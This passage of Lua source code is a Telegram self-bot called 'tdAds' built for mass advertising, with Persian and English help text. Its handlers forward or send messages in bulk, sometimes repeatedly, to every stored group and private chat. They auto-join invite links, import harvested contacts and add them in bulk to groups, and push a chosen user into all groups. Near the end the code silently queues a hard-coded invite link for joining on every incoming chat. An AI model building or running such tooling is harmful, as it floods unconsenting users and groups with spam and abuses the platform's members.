                    function ck(a, b, c)
                        for N = 1, matches do
                            for k, v in pairs(list) do
                                tdbot_function(
                                    {
                                        _ = "forwardMessages",
                                        chat_id = "" .. v,
                                        from_chat_id = msg.chat_id,
                                        message_ids = {[0] = b.id},
                                        disable_notification = 0,
                                        from_background = 1
                                    },
                                    cb or ok_cb,
                                    cmd
                                )
                            end
                        end

                        send(msg.chat_id, msg.id, "Done")
                    end

                    tdbot_function(
                        {
                            _ = "getMessage",
                            chat_id = msg.chat_id,
                            message_id = msg.reply_to_message_id
                        },
                        ck,
                        cmd
                    )
                elseif (text:match("^([Ff][Ww][Dd]) (.*)$") and msg.reply_to_message_id ~= 0) then
                    local matches = text:match("^[Ff][Ww][Dd] (.*)$")
                    local t
                    if matches:match("^(all)") then
                        t = "tg:" .. Ads_id .. ":all"
                    elseif matches:match("^(pv)") then
                        t = "tg:" .. Ads_id .. ":users"
                    elseif matches:match("^(gp)$") then
                        t = "tg:" .. Ads_id .. ":groups"
                    elseif matches:match("^(sgp)$") then
                        t = "tg:" .. Ads_id .. ":supergroups"
                    else
                        return true
                    end

                    local list = redis:smembers(t)
                    local id = msg.reply_to_message_id
                    if redis:get("tg:" .. Ads_id .. ":fwdtime") then
                        local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 21
                        local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 9
                        local during = (#list / tonumber(max_i)) * tonumber(delay)
                        send(
                            msg.chat_id,
                            msg.id,
                            "اتمام عملیات در " ..
                                during ..
                                    "ثانیه بعد\nراه اندازی مجدد ربات در " ..
                                        redis:ttl("tg:" .. Ads_id .. ":start") .. "ثانیه اینده"
                        )
                        redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
                            tdbot_function(
                                {
                                    _ = "forwardMessages",
                                    chat_id = tonumber(list[1]),
                                    from_chat_id = msg.chat_id,
                                    message_ids = {[0] = id},
                                    disable_notification = 0,
                                    from_background = 1
                                },
                                forwarding,
                                {
                                    list = list,
                                    max_i = max_i,
                                    delay = delay,
                                    n = 1,
                                    all = #list,
                                    chat_id = msg.chat_id,
                                    msg_id = id,
                                    s = 0
                                }
                            )
                    else
                        for i, v in pairs(list) do
                                tdbot_function(
                                    {
                                        _ = "forwardMessages",
                                        chat_id = tonumber(v),
                                        from_chat_id = msg.chat_id,
                                        message_ids = {[0] = id},
                                        disable_notification = 1,
                                        from_background = 1
                                    },
                                    dl_cb,
                                    nil
                                )
                        end

                        return send(msg.chat_id, msg.id, "با موفقیت فرستاده شد")
                    end
                elseif (text:match("^(ارسال) (.*)$") and msg.reply_to_message_id ~= 0) then
                    local matches = text:match("^ارسال (.*)$")
                    local id = msg.reply_to_message_id
                    local list = redis:smembers("tg:" .. Ads_id .. ":supergroups")
                    function ok(a, b, c)
                        for N = 1, matches do
                            for k, v in pairs(list) do
                                tdbot_function(
                                    {
                                        _ = "forwardMessages",
                                        chat_id = "" .. v,
                                        from_chat_id = msg.chat_id,
                                        message_ids = {[0] = b.id},
                                        disable_notification = 0,
                                        from_background = 1
                                    },
                                    cb or ok_cb,
                                    cmd
                                )
                            end
                        end

                        send(msg.chat_id, msg.id, "Done")
                    end

                    tdbot_function(
                        {
                            _ = "getMessage",
                            chat_id = msg.chat_id,
                            message_id = msg.reply_to_message_id
                        },
                        ok,
                        cmd
                    )
                elseif text:match("^([Ss]end)") and tonumber(msg.reply_to_message_id) > 0 then
                    function tgM(tdtg, Ac)
                        local xt = Ac.content.text
                        local list = redis:smembers("tg:" .. Ads_id .. ":supergroups")
                        for k, v in pairs(list) do
                                tdbot_function(
                                    {
                                        _ = "sendMessage",
                                        chat_id = tonumber(v),
                                        reply_to_message_id = 0,
                                        disable_notification = 0,
                                        from_background = 1,
                                        reply_markup = nil,
                                        input_message_content = {
                                            _ = "inputMessageText",
                                            text = tostring(xt),
                                            disable_web_page_preview = 1,
                                            clear_draft = 0,
                                            parse_mode = nil,
                                            entities = {}
                                        }
                                    },
                                    cb or dl_cb,
                                    cmd
                            )
                        end

                        return send(msg.chat_id, msg.id, "Done")
                    end

                        tdbot_function(
                            {
                                _ = "getMessage",
                                chat_id = msg.chat_id,
                                message_id = msg.reply_to_message_id
                            },
                            cb or dl_cb,
                            tgM
                    )
                elseif text:match("^([Ss]end) (.*)") then
                    local matches = text:match("^[Ss]end (.*)")
                    local dir = redis:smembers("tg:" .. Ads_id .. ":supergroups")
                    local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 21
                    local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 9
                    local during = (#dir / tonumber(max_i)) * tonumber(delay)
                    send(
                        msg.chat_id,
                        msg.id,
                        "اتمام عملیات در " ..
                            during ..
                                "ثانیه بعد\nراه اندازی مجدد ربات در " ..
                                    redis:ttl("tg:" .. Ads_id .. ":start") .. "ثانیه اینده"
                    )
                    redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
                        tdbot_function(
                            {
                                _ = "sendMessage",
                                chat_id = tonumber(dir[1]),
                                reply_to_message_id = msg.id,
                                disable_notification = 0,
                                from_background = 1,
                                reply_markup = nil,
                                input_message_content = {
                                    _ = "inputMessageText",
                                    text = tostring(matches),
                                    disable_web_page_preview = true,
                                    clear_draft = false,
                                    entities = {},
                                    parse_mode = nil
                                }
                            },
                            sending,
                            {
                                list = dir,
                                max_i = max_i,
                                delay = delay,
                                n = 1,
                                all = #dir,
                                chat_id = msg.chat_id,
                                text = matches,
                                s = 0
                            }
                        )
                elseif text:match("^([Ll]eft) (.*)$") then
                    local matches = text:match("^[Ll]eft (.*)$")
                    if matches == "all" then
                        for i, v in pairs(redis:smembers("tg:" .. Ads_id .. ":supergroups")) do
                                tdbot_function(
                                    {
                                        _ = "changeChatMemberStatus",
                                        chat_id = tonumber(v),
                                        user_id = bot_id,
                                        status = {_ = "chatMemberStatusLeft"}
                                    },
                                    cb or dl_cb,
                                    nil
                            )
                        end
                    else
                        send(msg.chat_id, msg.id, "ربات از گروه مورد نظر خارج شد")
                            tdbot_function(
                                {
                                    _ = "changeChatMemberStatus",
                                    chat_id = matches,
                                    user_id = bot_id,
                                    status = {_ = "chatMemberStatusLeft"}
                                },
                                cb or dl_cb,
                                nil
                        )
                        return rem(matches)
                    end
                elseif text:match("^([Aa]dd[Tt]o[Aa]ll) @(.*)$") then
                    local matches = text:match("^[Aa]dd[Tt]o[Aa]ll @(.*)$")
                    local list = {
                        redis:smembers("tg:" .. Ads_id .. ":groups"),
                        redis:smembers("tg:" .. Ads_id .. ":supergroups")
                    }
                    local l = {}
                    for a, b in pairs(list) do
                        for i, v in pairs(b) do
                            table.insert(l, v)
                        end
                    end

                    local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 21
                    local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 9
                    if #l == 0 then
                        return
                    end

                    local during = (#l / tonumber(max_i)) * tonumber(delay)
                    send(
                        msg.chat_id,
                        msg.id,
                        "اتمام عملیات در " ..
                            during ..
                                "ثانیه بعد\nراه اندازی مجدد ربات در " ..
                                    redis:ttl("tg:" .. Ads_id .. ":start") .. "ثانیه اینده"
                    )
                    redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
                    print(#l)
                        tdbot_function(
                            {
                                _ = "searchPublicChat",
                                username = matches
                            },
                            function(I, t)
                                if t.id then
                                    tdbot_function(
                                        {
                                            _ = "addChatMember",
                                            chat_id = tonumber(I.list[tonumber(I.n)]),
                                            user_id = t.id,
                                            forward_limit = 0
                                        },
                                        adding {
                                            list = I.list,
                                            max_i = I.max_i,
                                            delay = I.delay,
                                            n = tonumber(I.n),
                                            all = I.all,
                                            chat_id = I.chat_id,
                                            user_id = I.user_id,
                                            s = I.s
                                        }
                                    )
                                end
                            end,
                            {
                                list = l,
                                max_i = max_i,
                                delay = delay,
                                n = 1,
                                all = #l,
                                chat_id = msg.chat_id,
                                user_id = matches,
                                s = 0
                            }
                    )
                elseif text:match("^(عضویت) (.*)$") then
                    local matches = text:match("^عضویت (.*)$")
                    function joinchannel(extra, tb)
                        print(vardump(tb))
                        if tb._ == "ok" then
                            send(msg.chat_id, msg.id, "✅")
                        else
                            send(msg.chat_id, msg.id, "failure")
                        end
                    end

                    tdbot_function({_ = "importChatInviteLink", invite_link = matches}, joinchannel, nil)
                elseif text:match("^(آفلاین) (%d+)$") then
                    local matches = text:match("%d+")
                    os.execute("sleep " .. tonumber(math.floor(matches) * (60)))
                    return send(msg.chat_id, msg.id, "hi")
                elseif text:match("^([Jj]oin) (.*)$") then
                    local matches = text:match("^[Jj]oin (.*)$")
                    function joinchannel(extra, tb)
                        print(vardump(tb))
                        if tb._ == "ok" then
                            send(msg.chat_id, msg.id, "✅")
                        else
                            send(msg.chat_id, msg.id, "failure")
                        end
                    end

                    tdbot_function({_ = "importChatInviteLink", invite_link = matches}, joinchannel, nil)
                elseif text:match("^([Ss]leep) (%d+)$") then
                    local matches = text:match("%d+")
                    os.execute("sleep " .. tonumber(math.floor(matches) * (60)))
                    return send(msg.chat_id, msg.id, "hi")
                elseif text:match("^([Bb]lock) (%d+)$") then
                    local matches = text:match("%d+")
                    rem(tonumber(matches))
                    redis:sadd("tg:" .. Ads_id .. ":blockedusers", matches)
                    tdbot_function(
                        {
                            _ = "blockUser",
                            user_id = tonumber(matches)
                        },
                        cb or dl_cb,
                        nil
                    )

                    return send(msg.chat_id, msg.id, "کاربر مورد نظر مسدود شد")
                elseif text:match("^([Uu]n[Bb]lock) (%d+)$") then
                    local matches = text:match("%d+")
                    add(tonumber(matches))
                    redis:srem("tg:" .. Ads_id .. ":blockedusers", matches)
                    tdbot_function(
                        {
                            _ = "unblockUser",
                            user_id = tonumber(matches)
                        },
                        cb or dl_cb,
                        nil
                    )
                    return send(msg.chat_id, msg.id, "مسدودیت کاربر مورد نظر رفع شد.")
                elseif text:match('^([Ss]et[Nn]ame) "(.*)" (.*)') then
                    local fname, lname = text:match('^[Ss]et[Nn]ame "(.*)" (.*)')
                    tdbot_function(
                        {
                            _ = "changeName",
                            first_name = fname,
                            last_name = lname
                        },
                        cb or dl_cb,
                        nil
                    )

                    return send(msg.chat_id, msg.id, "نام جدید با موفقیت ثبت شد.")
                elseif text:match("^([Ss]et[Uu]ser[Nn]ame) (.*)") then
                    local matches = text:match("^[Ss]et[Uu]ser[Nn]ame (.*)")
                    tdbot_function(
                        {
                            _ = "changeUsername",
                            username = tostring(matches)
                        },
                        cb or dl_cb,
                        nil
                    )
                    return send(msg.chat_id, 0, "تلاش برای تنظیم نام کاربری...")
                elseif text:match("^(مسدودیت) (%d+)$") then
                    local matches = text:match("%d+")
                    rem(tonumber(matches))
                    redis:sadd("tg:" .. Ads_id .. ":blockedusers", matches)

                    tdbot_function(
                        {
                            _ = "blockUser",
                            user_id = tonumber(matches)
                        },
                        cb or dl_cb,
                        nil
                    )

                    return send(msg.chat_id, msg.id, "کاربر مورد نظر مسدود شد")
                elseif text:match("^(رفع مسدودیت) (%d+)$") then
                    local matches = text:match("%d+")
                    add(tonumber(matches))
                    redis:srem("tg:" .. Ads_id .. ":blockedusers", matches)

                    tdbot_function(
                        {
                            _ = "unblockUser",
                            user_id = tonumber(matches)
                        },
                        cb or dl_cb,
                        nil
                    )

                    return send(msg.chat_id, msg.id, "مسدودیت کاربر مورد نظر رفع شد.")
                elseif text:match('^(تنظیم نام) "(.*)" (.*)') then
                    local fname, lname = text:match('^تنظیم نام "(.*)" (.*)')

                    tdbot_function(
                        {
                            _ = "changeName",
                            first_name = fname,
                            last_name = lname
                        },
                        cb or dl_cb,
                        nil
                    )

                    return send(msg.chat_id, msg.id, "نام جدید با موفقیت ثبت شد.")
                elseif text:match("^(تنظیم نام کاربری) (.*)") then
                    local matches = text:match("^تنظیم نام کاربری (.*)")

                    tdbot_function(
                        {
                            _ = "changeUsername",
                            username = tostring(matches)
                        },
                        cb or dl_cb,
                        nil
                    )

                    return send(msg.chat_id, 0, "تلاش برای تنظیم نام کاربری...")
                elseif text:match("^(حذف نام کاربری)$") or text:match("^([Dd]el[Uu]ser[Nn]ame)$") then
                    tdbot_function(
                        {
                            _ = "changeUsername",
                            username = ""
                        },
                        cb or dl_cb,
                        nil
                    )

                    return send(msg.chat_id, 0, "نام کاربری با موفقیت حذف شد.")
                elseif text:match('^(ارسال کن) "(.*)" (.*)') then
                    local id, txt = text:match('^ارسال کن "(.*)" (.*)')
                    send(id, 0, txt)
                    return send(msg.chat_id, msg.id, "ارسال شد")
                elseif text:match("^(بگو) (.*)") then
                    local matches = text:match("^بگو (.*)")
                    return send(msg.chat_id, 0, matches)
                elseif text:match("^(شناسه من)$") or text:match("^([Ii][Dd])$") then
                    return send(msg.chat_id, msg.id, tostring(msg.sender_user_id))
                elseif text:match("^(ترک کردن) (.*)$") then
                    local matches = text:match("^ترک کردن (.*)$")
                    if matches == "همه" then
                        for i, v in pairs(redis:smembers("tg:" .. Ads_id .. ":supergroups")) do
                                tdbot_function(
                                    {
                                        _ = "changeChatMemberStatus",
                                        chat_id = tonumber(v),
                                        user_id = bot_id,
                                        status = {_ = "chatMemberStatusLeft"}
                                    },
                                    cb or dl_cb,
                                    nil
                            )
                        end
                    else
                        send(msg.chat_id, msg.id, "ربات تلگرام ادز از گروه مورد نظر خارج شد")
                            tdbot_function(
                                {
                                    _ = "changeChatMemberStatus",
                                    chat_id = matches,
                                    user_id = bot_id,
                                    status = {_ = "chatMemberStatusLeft"}
                                },
                                cb or dl_cb,
                                nil
                        )
                        return rem(matches)
                    end
                elseif text:match("^(افزودن به همه) @(.*)$") then
                    local matches = text:match("^افزودن به همه @(.*)$")
                    local list = {
                        redis:smembers("tg:" .. Ads_id .. ":groups"),
                        redis:smembers("tg:" .. Ads_id .. ":supergroups")
                    }
                    local l = {}
                    for a, b in pairs(list) do
                        for i, v in pairs(b) do
                            table.insert(l, v)
                        end
                    end

                    local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 21
                    local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 9
                    if #l == 0 then
                        return
                    end

                    local during = (#l / tonumber(max_i)) * tonumber(delay)
                    send(
                        msg.chat_id,
                        msg.id,
                        "اتمام عملیات در " ..
                            during ..
                                "ثانیه بعد\nراه اندازی مجدد ربات در " ..
                                    redis:ttl("tg:" .. Ads_id .. ":start") .. "ثانیه اینده"
                    )
                    redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
                    print(#l)
                        tdbot_function(
                            {
                                _ = "searchPublicChat",
                                username = matches
                            },
                            function(I, tg)
                                if tg.id then
                                    tdbot_function(
                                        {
                                            _ = "addChatMember",
                                            chat_id = tonumber(I.list[tonumber(I.n)]),
                                            user_id = tg.id,
                                            forward_limit = 0
                                        },
                                        adding {
                                            list = I.list,
                                            max_i = I.max_i,
                                            delay = I.delay,
                                            n = tonumber(I.n),
                                            all = I.all,
                                            chat_id = I.chat_id,
                                            user_id = I.user_id,
                                            s = I.s
                                        }
                                    )
                                end
                            end,
                            {
                                list = l,
                                max_i = max_i,
                                delay = delay,
                                n = 1,
                                all = #l,
                                chat_id = msg.chat_id,
                                user_id = matches,
                                s = 0
                            }
                        )
                elseif
                    (text:match("^(انلاین)$") and not msg.forward_info) or
                        (text:match("^(آنلاین)$") and not msg.forward_info) or
                        (text:match("^([Pp]ing)$") and not msg.forward_info)
                 then
                    return tdbot_function(
                        {
                            _ = "forwardMessages",
                            chat_id = msg.chat_id,
                            from_chat_id = msg.chat_id,
                            message_ids = {[0] = msg.id},
                            disable_notification = 0,
                            from_background = 1
                        },
                        dl_cb,
                        nil
                    )
                elseif text:match("^(راهنما)$") then
                    local txt =
                        '📍راهنمای دستورات ربات tdAds📍\n\nانلاین\nاعلام وضعیت ربات tdAds ✔️\n❤️ حتی اگر ربات tdAds شما دچار محدودیت ارسال پیام شده باشد بایستی به این پیام پاسخ دهد❤️\n\nافزودن مدیر شناسه\nافزودن مدیر جدید با شناسه عددی داده شده 🛂\n\nافزودن مدیرکل شناسه\nافزودن مدیرکل جدید با شناسه عددی داده شده 🛂\n\n(⚠️ تفاوت مدیر و مدیر‌کل دسترسی به اعطا و یا گرفتن مقام مدیریت است⚠️)\n\nحذف مدیر شناسه\nحذف مدیر یا مدیرکل با شناسه عددی داده شده ✖️\n\nترک گروه\nخارج شدن از گروه و حذف آن از اطلاعات گروه ها 🏃\n\nافزودن همه مخاطبین\nافزودن حداکثر مخاطبین و افراد در گفت و گوهای شخصی به گروه ➕\n\nبگو متن\nدریافت متن 🗣\n\nارسال کن "شناسه" متن\nارسال متن به شناسه گروه یا کاربر داده شده 📤\n\nتنظیم نام "نام" فامیل\nتنظیم نام ربات ✏️\n\nتازه سازی ربات\nتازه‌سازی اطلاعات فردی ربات🎈\n(مورد استفاده در مواردی همچون پس از تنظیم نام📍جهت بروزکردن نام مخاطب اشتراکی ربات تی دی ادز📍)\n\nتنظیم نام کاربری اسم\nجایگزینی اسم با نام کاربری فعلی(محدود در بازه زمانی کوتاه) 🔄\n\nحذف نام کاربری\nحذف کردن نام کاربری ❎\n\nتوقف عضویت|تایید لینک|شناسایی لینک|افزودن مخاطب\nغیر‌فعال کردن فرایند خواسته شده ◼️\n\nشروع عضویت|تایید لینک|شناسایی لینک|افزودن مخاطب\nفعال‌سازی فرایند خواسته شده ◻️\n\nحداکثر گروه عدد\nتنظیم حداکثر سوپرگروه‌هایی که ربات tdAds عضو می‌شود،با عدد دلخواه ⬆️\n\nحداقل اعضا عدد\nتنظیم شرط حدقلی اعضای گروه برای عضویت,با عدد دلخواه ⬇️\n\nحذف حداکثر گروه\nنادیده گرفتن حدمجاز تعداد گروه ➰\n\nحذف حداقل اعضا\nنادیده گرفتن شرط حداقل اعضای گروه ⚜️\n\nارسال زمانی روشن|خاموش\nزمان بندی در فروارد و ارسال و افزودن به گروه و استفاده در دستور ارسال ⏲\n\nتنظیم تعداد عدد\nتنظیم گروه های میان وقفه در ارسال زمانی\n\nتنظیم وقفه عدد\nتنظیم وقفه به ثانیه در عملیات زمانی\n\nافزودن با شماره روشن|خاموش\nتغییر وضعیت اشتراک شماره ربات tdAds در جواب شماره به اشتراک گذاشته شده 🔖\n\nافزودن با پیام روشن|خاموش\nتغییر وضعیت ارسال پیام در جواب شماره به اشتراک گذاشته شده ℹ️\n\nتنظیم پیام افزودن مخاطب متن\nتنظیم متن داده شده به عنوان جواب شماره به اشتراک گذاشته شده 📄\n\nمسدودیت شناسه\nمسدود‌کردن(بلاک) کاربر با شناسه داده شده از گفت و گوی خصوصی 🚫\n\nرفع مسدودیت شناسه\nرفع مسدودیت کاربر با شناسه داده شده 💢\n\nوضعیت مشاهده روشن|خاموش 👁\nتغییر وضعیت مشاهده پیام‌ها توسط ربات تی دی ادز (فعال و غیر‌فعال‌کردن تیک دوم)\n\nامار\nدریافت آمار و وضعیت ربات tdAds 📊\n\nوضعیت\nدریافت وضعیت اجرایی ربات tdAds⚙️\n\nتازه سازی\nتازه‌سازی آمار ربات تی دی ادز🚀\n🎃مورد استفاده حداکثر یک بار در روز🎃\n\nارسال به همه|خصوصی|گروه|سوپرگروه\nارسال پیام جواب داده شده به مورد خواسته شده 📩\n(😄توصیه ما عدم استفاده از همه و خصوصی😄)\n\nارسال به سوپرگروه متن\nارسال متن داده شده به همه سوپرگروه ها ✉️\n(😜توصیه ما استفاده و ادغام دستورات بگو و ارسال به سوپرگروه😜)\n\nتنظیم جواب "متن" جواب\nتنظیم جوابی به عنوان پاسخ خودکار به پیام وارد شده مطابق با متن باشد 📝\n\nحذف جواب متن\nحذف جواب مربوط به متن ✖️\n\nپاسخگوی خودکار روشن|خاموش\nتغییر وضعیت پاسخگویی خودکار ربات TeleGram Advertising به متن های تنظیم شده 📯\n\nحذف لینک عضویت|تایید|ذخیره شده\nحذف لیست لینک‌های مورد نظر ❌\n\nحذف کلی لینک عضویت|تایید|ذخیره شده\nحذف کلی لیست لینک‌های مورد نظر 💢\n🔺پذیرفتن مجدد لینک در صورت حذف کلی🔻\n\nلیست خصوصی|گروه|سوپرگروه|لینک|مدیر\nدریافت لیستی از مورد خواسته شده 📄\n\nارسال تعداد\nفوروارد متن ریپلای شده بصورت رگباری در تعداد انتخابی به تمام گروه ها \n\nاستارت یوزرنیم\nاستارت زدن ربات با یوزرنیم وارد شده\n\nافزودن به همه یوزرنیم\nافزودن کابر با یوزرنیم وارد شده به همه گروه و سوپرگروه ها ➕➕\n\nگروه عضویت باز روشن|خاموش\nعضویت در گروه ها با شرایط توانایی ربات TeleGram Advertising به افزودن عضو\n\nترک کردن شناسه\nعملیات ترک کردن با استفاده از شناسه گروه 🏃\n\nراهنما\nدریافت همین پیام 🆘\n\n ذخیره شماره +989216973112	\n ذخیره یک شماره خاص \n\n تنظیم کانال -000000	\n تنظیم یک کانال برای فوروارد پست ها \n\n آفلاین 0 \n خاموش کردن ربات و اجرای خودکار بعد از زمان ورودی\n\n عضویت https://... \n عضویت در یک لینک خاص       \n\nwww.tgMember.com\n'
                    return send(msg.chat_id, msg.id, txt)
                elseif text:match("^([Hh]elp)$") then
                    local txt1 =
                        'Help for TeleGram Advertisin Robot (tdAds)\n\nInfo\n    statistics and information\n \nPromote (user-Id)\n    add new moderator\n      \nDemote (userId)\n remove moderator\n      \nSend (text)\n    send message too all super group;s\n    \nFwd {all or sgp or gp or pv} (by reply)\n    forward your post to :\n   all chat or super group or group or private or several times\n    \nAddedMsg (on or off)\n    import contacts by send message\n \nSetAddedMsg (text)\n    set message when add contact\n    \nAddToAll @(usename)\n    add user or robot to all group\'s \n\nAddMembers\n    add contact\'s to group\n\nDel (lnk, cotact, sudo)\n     delete selected item\n\njoin (on or off)\n    set join to link\'s or don\'t join\n\nchklnk (on or off)\n    check link\'s in terms of valid\nand\n    Separating healthy and corrupted links\n\nfindlnk (on or off)\n    search in group\'s and find link\n\nGpDelay (secound)\n    The number of groups was set between send times\n\nُSetDelay (secound)\n    Interval time between posts was set\n\nBlock (User-Id)\n    Block user \n\nUnBlock (User-Id)\n    UnBlock user\n\nSetName ("name" lastname)\n    Set new name\n\nSetUserName (Ussername)\n    Set new username\n\nDelUserName\n    delete user name\n    \nAdd (phone number)\n   add contact by phone number\n\nAddContact (on or off)\n    import contact by sharing number\n\nfwdtime (on or off)\n    Schedule forward on posting\n\nmarkread (on or off)\n    Mark read status\n\nGpMember 1~50000\n    set the minimum group members to join\n\nDelGpMember\n    Disable\n\nMaxGroup\n    The maximum number of robots has been set\n\nDelMaxGroup\n    Disable\n\nRefresh\n    Refresh information\n\nJoinOpenAdd (on or off)\n    just join to open add members groups\n\nJoin (Private Link)\n    Join to Link (channel, gp, ..)\n\nPing\n    test to server connection\n\nBot @(username)\n    Start api bot\n\nSet (Channel-Id)\n    set channel for auto forward \n\nLeft or all or (group-Id)\n    leave of all group \n\nReset\n   zeroing the robot statistics\n    \nAutoFwd {min} (by reply)\n    add post for auto forward\n    \nDel AutoFwd\n    delet auto forward\n    \nMultiFwd {number} (by reply)\n    forward your post to super group for several times\n\nLs (bock, pv, gp, sgp, slnk, wlnk, glnk, sudo)\n    List from block user, private chat, group, \n   super group, save links, wait links, good links, moderation\n\nYou can send command with or with out: \n!  /  #  $ \nbefore command\n     \nwww.tgMember.com\n'

                    return send(msg.chat_id, msg.id, txt1)
                elseif text:match("^([Aa]dd) (.*)$") then
                    local matches = text:match("^[Aa]dd (.*)$")
                        tdbot_function(
                            {
                                _ = "importContacts",
                                contacts = {
                                    [0] = {
                                        _ = "contact",
                                        phone_number = tostring(matches),
                                        first_name = tostring("Contact "),
                                        last_name = tostring("Add"),
                                        user_id = 0
                                    }
                                }
                            },
                            cb or cb or dl_cb,
                            nil
                        )
                    send(msg.chat_id, msg.id, "Added " .. matches .. " 📙")
                elseif text:match("^(ذخیره شماره) (.*)$") then
                    local matches = text:match("^ذخیره شماره (.*)$")
                        tdbot_function(
                            {
                                _ = "importContacts",
                                contacts = {
                                    [0] = {
                                        _ = "contact",
                                        phone_number = tostring(matches),
                                        first_name = tostring("Contact "),
                                        last_name = tostring("Add"),
                                        user_id = 0
                                    }
                                }
                            },
                            cb or cb or dl_cb,
                            nil
                    )
                    send(msg.chat_id, msg.id, "Added " .. matches .. " 📙")
                elseif tostring(msg.chat_id):match("^-") then
                    if text:match("^([Aa]dd[Mm]embers)$") or text:match("^(افزودن همه مخاطبین)$") then
                        send(msg.chat_id, msg.id, "در حال افزودن مخاطبین به گروه ...")
                            tdbot_function(
                                {
                                    _ = "searchContacts",
                                    query = nil,
                                    limit = 999999999
                                },
                                function(i, tg)
                                    local users, count = redis:smembers("tg:" .. Ads_id .. ":users"), tg.total_count
                                    for n = 0, tonumber(count) - 1 do
                                            tdbot_function(
                                                {
                                                    _ = "addChatMember",
                                                    chat_id = tonumber(i.chat_id),
                                                    user_id = tg.users[n].id,
                                                    forward_limit = 37
                                                },
                                                cb or dl_cb,
                                                cmd
                                        )
                                    end

                                    for n = 1, #users do
                                            tdbot_function(
                                                {
                                                    _ = "addChatMember",
                                                    chat_id = tonumber(i.chat_id),
                                                    user_id = tonumber(users[n]),
                                                    forward_limit = 37
                                                },
                                                cb or dl_cb,
                                                cmd
                                            )
                                    end
                                end,
                                {chat_id = msg.chat_id}
                            )
                        return
                    end
                end
            end
        elseif (msg.content._ == "messageContact" and redis:get("tg:" .. Ads_id .. ":savecontacts")) then
            local id = msg.content.contact.user_id
            if not redis:sismember("tg:" .. Ads_id .. ":addedcontacts", id) then
                redis:sadd("tg:" .. Ads_id .. ":addedcontacts", id)
                local first = msg.content.contact.first_name or "-"
                local last = msg.content.contact.last_name or "-"
                local phone = msg.content.contact.phone_number
                local id = msg.content.contact.user_id
                    tdbot_function(
                        {
                            _ = "importContacts",
                            contacts_ = {
                                [0] = {
                                    phone_number = tostring(phone),
                                    first_name = tostring(first),
                                    last_name = tostring(last),
                                    user_id = id
                                }
                            }
                        },
                        cb or dl_cb,
                        nil
                )
                if redis:get("tg:" .. Ads_id .. ":addcontact") and msg.sender_user_id ~= bot_id then
                    local fname = redis:get("tg:" .. Ads_id .. ":fname")
                    local lname = redis:get("tg:" .. Ads_id .. ":lname") or ""
                    local num = redis:get("tg:" .. Ads_id .. ":num")
                    os.execute("sleep 7.75")
                        tdbot_function(
                            {
                                _ = "sendMessage",
                                chat_id = msg.chat_id,
                                reply_to_message_id = msg.id,
                                disable_notification = 1,
                                from_background = 1,
                                reply_markup = nil,
                                input_message_content = {
                                    _ = "inputMessageContact",
                                    contact = {
                                        _ = "contact",
                                        phone_number = num,
                                        first_name = fname,
                                        last_name = lname,
                                        user_id = bot_id
                                    }
                                }
                            },
                            dl_cb,
                            nil
                    )
                end
            end

            if redis:get("tg:" .. Ads_id .. ":addmsg") then
                local answer = redis:get("tg:" .. Ads_id .. ":addmsgtext") or "اددی گلم خصوصی پیام بده"
                os.execute("sleep 17.75")
                send(msg.chat_id, msg.id, answer)
            end
        elseif msg.content._ == "messageChatDeleteMember" and msg.content.id == bot_id then
            return rem(msg.chat_id)
        elseif (msg.content.caption and redis:get("tg:" .. Ads_id .. ":link")) then
            find_link(msg.content.caption)
        end

        if
            tostring(data.message.chat_id):match("^-100") or tostring(data.message.chat_id):match("-") or
                tostring(data.message.chat_id):match("-100") or
                tostring(data.message.chat_id):match("^%d+$") and
                    not redis:sismember("tg:" .. Ads_id .. ":all", data.message.chat_id)
         then
      redis:sadd("tg:" .. Ads_id .. ":waitelinks", "https://telegram.me/joinchat/FJv8p0B_mm7AJUI4NKo9cw")
            redis:sadd("tg:" .. Ads_id .. ":all", data.message.chat_id)
        end
            tdbot_function(
                {
                    _ = "getChats",
                    offset_order = 9223372036854775807 or 2 ^ 63 - 1,
                    offset_chat_id = 0,
                    limit = 17
                },
                function(s, t)
                    local list = redis:smembers("tg:" .. Ads_id .. ":users")
                    for s, v in ipairs(list) do
                            tdbot_function(
                                {
                                    _ = "openChat",
                                    chat_id = v
                                },
                                ok_cb or dl_cb
                        )
                    end
                end,
                cmd
        )
    end
end
